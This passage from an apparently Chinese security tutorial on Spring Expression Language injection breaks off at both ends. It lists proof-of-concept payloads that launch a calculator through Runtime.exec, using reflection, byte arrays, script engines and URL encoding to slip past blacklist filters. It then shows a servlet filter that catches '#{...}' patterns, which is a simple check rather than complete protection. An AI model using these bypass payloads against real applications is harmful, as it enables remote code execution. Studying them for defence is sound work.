punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.l"</span><span class="token operator">+</span><span class="token string">"ang.Ru"</span><span class="token operator">+</span><span class="token string">"ntime"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"getRu"</span><span class="token operator">+</span><span class="token string">"ntime"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.l"</span><span class="token operator">+</span><span class="token string">"ang.Ru"</span><span class="token operator">+</span><span class="token string">"ntime"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"cmd"</span><span class="token punctuation">,</span><span class="token string">"/C"</span><span class="token punctuation">,</span><span class="token string">"calc"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token comment">// 同上，需要有上下文环境</span>#<span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.l"</span><span class="token operator">+</span><span class="token string">"ang.Ru"</span><span class="token operator">+</span><span class="token string">"ntime"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"ex"</span><span class="token operator">+</span><span class="token string">"ec"</span><span class="token punctuation">,</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.l"</span><span class="token operator">+</span><span class="token string">"ang.Ru"</span><span class="token operator">+</span><span class="token string">"ntime"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"getRu"</span><span class="token operator">+</span><span class="token string">"ntime"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.l"</span><span class="token operator">+</span><span class="token string">"ang.Ru"</span><span class="token operator">+</span><span class="token string">"ntime"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"cmd"</span><span class="token punctuation">,</span><span class="token string">"/C"</span><span class="token punctuation">,</span><span class="token string">"calc"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token comment">// 当执行的系统命令被过滤或者被URL编码掉时，可以通过String类动态生成字符，Part1</span><span class="token comment">// byte数组内容的生成后面有脚本</span><span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>ProcessBuilder</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>String</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token number">99</span><span class="token punctuation">,</span><span class="token number">97</span><span class="token punctuation">,</span><span class="token number">108</span><span class="token punctuation">,</span><span class="token number">99</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">// 当执行的系统命令被过滤或者被URL编码掉时，可以通过String类动态生成字符，Part2</span><span class="token comment">// byte数组内容的生成后面有脚本</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Runtime</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Character</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">99</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Character</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">97</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Character</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">108</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Character</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token number">99</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">// JavaScript引擎通用PoC</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">javax<span class="token punctuation">.</span>script<span class="token punctuation">.</span></span>ScriptEngineManager</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getEngineByName</span><span class="token punctuation">(</span><span class="token string">"nashorn"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">"s=[3];s[0]='cmd';s[1]='/C';s[2]='calc';java.la"</span><span class="token operator">+</span><span class="token string">"ng.Run"</span><span class="token operator">+</span><span class="token string">"time.getRu"</span><span class="token operator">+</span><span class="token string">"ntime().ex"</span><span class="token operator">+</span><span class="token string">"ec(s);"</span><span class="token punctuation">)</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span>StreamUtils</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">copy</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">javax<span class="token punctuation">.</span>script<span class="token punctuation">.</span></span>ScriptEngineManager</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getEngineByName</span><span class="token punctuation">(</span><span class="token string">"JavaScript"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">eval</span><span class="token punctuation">(</span><span class="token string">"xxx"</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token comment">// JavaScript引擎+反射调用</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span>StreamUtils</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">copy</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">javax<span class="token punctuation">.</span>script<span class="token punctuation">.</span></span>ScriptEngineManager</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getEngineByName</span><span class="token punctuation">(</span><span class="token string">"JavaScript"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">eval</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.l"</span><span class="token operator">+</span><span class="token string">"ang.Ru"</span><span class="token operator">+</span><span class="token string">"ntime"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"ex"</span><span class="token operator">+</span><span class="token string">"ec"</span><span class="token punctuation">,</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.l"</span><span class="token operator">+</span><span class="token string">"ang.Ru"</span><span class="token operator">+</span><span class="token string">"ntime"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token string">"getRu"</span><span class="token operator">+</span><span class="token string">"ntime"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.l"</span><span class="token operator">+</span><span class="token string">"ang.Ru"</span><span class="token operator">+</span><span class="token string">"ntime"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"cmd"</span><span class="token punctuation">,</span><span class="token string">"/C"</span><span class="token punctuation">,</span><span class="token string">"calc"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token comment">// JavaScript引擎+URL编码</span><span class="token comment">// 其中URL编码内容为：</span><span class="token comment">// 不加最后的getInputStream()也行，因为弹计算器不需要回显</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span>StreamUtils</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">copy</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">javax<span class="token punctuation">.</span>script<span class="token punctuation">.</span></span>ScriptEngineManager</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getEngineByName</span><span class="token punctuation">(</span><span class="token string">"JavaScript"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">eval</span><span class="token punctuation">(</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span>URLDecoder</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span><span class="token string">"%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%2e%67%65%74%52%75%6e%74%69%6d%65%28%29%2e%65%78%65%63%28%22%63%61%6c%63%22%29%2e%67%65%74%49%6e%70%75%74%53%74%72%65%61%6d%28%29"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token comment">// 黑名单过滤".getClass("，可利用数组的方式绕过，还未测试成功</span>'<span class="token char">'['</span><span class="token keyword">class</span>'<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span>'<span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Runtime</span>'<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredMethods</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>'<span class="token char">'['</span><span class="token keyword">class</span>'<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span>'<span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span></span>Runtime</span>'<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredMethods</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token char">'calc'</span><span class="token punctuation">)</span><span class="token comment">// JDK9新增的shell，还未测试</span><span class="token class-name">T</span><span class="token punctuation">(</span><span class="token class-name">SomeWhitelistedClassNotPartOfJDK</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ClassLoader<span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span><span class="token string">"jdk.jshell.JShell"</span><span class="token punctuation">,</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">.</span>Methods<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">eval</span><span class="token punctuation">(</span>'whatever java code in one statement'<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h1><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">Filter</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">FilterChain</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">FilterConfig</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">ServletException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">ServletRequest</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">ServletResponse</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span>http<span class="token punctuation">.</span></span><span class="token class-name">HttpServletRequest</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Enumeration</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>regex<span class="token punctuation">.</span></span><span class="token class-name">Pattern</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SpELInjectionFilter</span> <span class="token keyword">implements</span> <span class="token class-name">Filter</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// Regex pattern to detect potential SpEL injections</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">Pattern</span> <span class="token constant">SPEL_INJECTION_PATTERN</span> <span class="token operator">=</span> <span class="token class-name">Pattern</span><span class="token punctuation">.</span><span class="token function">compile</span><span class="token punctuation">(</span><span class="token string">"#\\&#123;[^&#125;]+\\&#125;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token class-name">FilterConfig</span> filterConfig<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ServletException</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// Initialization code if necessary</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">doFilter</span><span class="token punctuation">(</span><span class="token class-name">ServletRequest</span> request<span class="token punctuation">,</span> <span class="token class-name">ServletResponse</span> response<span class="token punctuation">,</span> <span class="token class-name">FilterChain</span> chain<span class="token punctuation">)</span>            <span class="token keyword">throws</span> <span class="token class-name">IOException</span><span class="token punctuation">,</span> <span class="token class-name">ServletException</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>request <span class="token keyword">instanceof</span> <span class="token class-name">HttpServletRequest</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">HttpServletRequest</span> httpRequest <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span><span class="token punctuation">)</span> request<span class="token punctuation">;</span>            <span class="token comment">// Check query parameters</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">String</span> param <span class="token operator">:</span> httpRequest<span class="token punctuation">.</span><span class="token function">getParameterMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">keySet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> values <span class="token operator">=</span> httpRequest<span class="token punctuation">.</span><span class="token function">getParameterValues</span><span class="token punctuation">(</span>param<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token class-name">String</span> value <span class="token operator">:</span> values<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isPotentialSpELInjection</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">ServletException</span><span class="token punctuation">(</span><span class="token string">"Potential SpEL injection detected in parameter: "</span> <span class="token operator">+</span> param<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>            <span class="token comment">// Check headers</span>            <span class="token class-name">Enumeration</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">></span></span> headerNames <span class="token operator">=</span> httpRequest<span class="token punctuation">.</span><span class="token function">getHeaderNames</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">while</span> <span class="token punctuation">(</span>headerNames<span class="token punctuation">.</span><span class="token function">hasMoreElements</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token class-name">String</span> header <span class="token operator">=</span> headerNames<span class="token punctuation">.</span><span class="token function">nextElement</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token class-name">String</span> headerValue <span class="token operator">=</span> httpRequest<span class="token punctuation">.</span><span class="token function">getHeader</span><span class="token punctuation">(</span>header<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isPotentialSpELInjection</span><span class="token punctuation">(</span>headerValue<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">ServletException</span><span class="token punctuation">(</span><span class="token string">"Potential SpEL injection detected in header: "</span> <span class="token operator">+</span> header<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">// Continue with the filter chain</span>        chain<span class="token punctuation">.</span><span class="token function">doFilter</span><span class="token punctuation">(</span>request<span class="token punctuation">,</span> response<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// Cleanup code if necessary</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// Method to check if a value contains potential SpEL injection patterns</span>    <span class="token keyword">private</span> <span class="token keyword">boolean</span> <span class="token function">isPotentialSpELInjection</span><span class="token punctuation">(</span><span class="token class-name">String</span> value<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token constant">SPEL_INJECTION_PATTERN</span><span class="token punctuation">.</span><span class="token function">matcher</span><span class="token punctuation">(</span>value<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>web.xml</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-name</span><span class="token punctuation">></span></span>SpELInjectionFilter<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-name</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-class</span><span class="token punctuation">></span></span>com.example.filters.SpELInjectionFilter<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-class</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-mapping</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>filter-name</span><span class="token punctuation">></span></span>SpELInjectionFilter<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-name</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url-pattern</span><span class="token punctuation">></span></span>/*<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url-pattern</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>filter-mapping</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果是springboot，过滤器类：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>filters<span class="token punctuation">.</span></span><span class="token class-name">SpELInjectionFilter</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>boot<span class="token punctuation">.</span>web<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">FilterRegistrationBean</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>context<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Bean</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>boot<span class="token punctuation">.</span></span><span class="token class-name">SpringApplication</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>boot<span class="token punctuation">.</span>autoconfigure<span class="token punctuation">.</span></span><span class="token class-name">SpringBootApplication</span></span><span class="token punctuation">;</span><span class="token annotation punctuation">@SpringBootApplication</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MySpringBootApplication</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">SpringApplication</span><span class="token punctuation">.</span><span class="token function">run</span><span class="token punctuation">(</span><span class="token class-name">MySpringBootApplication</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> args<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token annotation punctuation">@Bean</span>    <span class="token keyword">public</span> <span class="token class-name">FilterRegistrationBean</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">SpELInjectionFilter</span><span class="token punctuation">></span></span> <span class="token function">spELInjectionFilter</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">FilterRegistrationBean</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">SpELInjectionFilter</span><span class="token punctuation">></span></span> registrationBean <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FilterRegistrationBean</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        registrationBean<span class="token punctuation">.</span><span class="token function">setFilter</span><span class="token punctuation">(</span><span class="token 